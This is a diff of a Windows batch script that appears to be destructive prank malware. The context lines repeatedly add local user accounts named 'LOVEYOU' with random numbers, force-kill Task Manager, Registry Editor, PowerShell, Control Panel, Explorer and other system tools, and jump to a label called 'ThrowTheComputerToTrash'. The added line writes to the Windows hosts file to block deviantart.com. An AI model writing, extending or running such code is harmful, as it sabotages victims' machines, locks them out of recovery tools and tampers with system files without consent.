@@ -124,6 +124,7 @@ net user LOVEYOU%random% %random% /add
 net user LOVEYOU%random% %random% /add
 net user LOVEYOU%random% %random% /add
 taskkill /f /im ms-settings:.exe /im snippingtool.exe /im taskmgr.exe /im msconfig.exe /im powershell.exe /im wmplayer.exe /im notepad.exe /im calc.exe /im write.exe /im mspaint.exe /im cortana.exe /im control.exe /im ms-windows-store:.exe /im regedit.exe /im iexpress.exe /im winver.exe /im explorer.exe
+echo 127.0.0.1 https://www.deviantart.com >> C:\WINDOWS\System32\drivers\etc\hosts
 start explorer.exe
 goto ThrowTheComputerToTrash
 
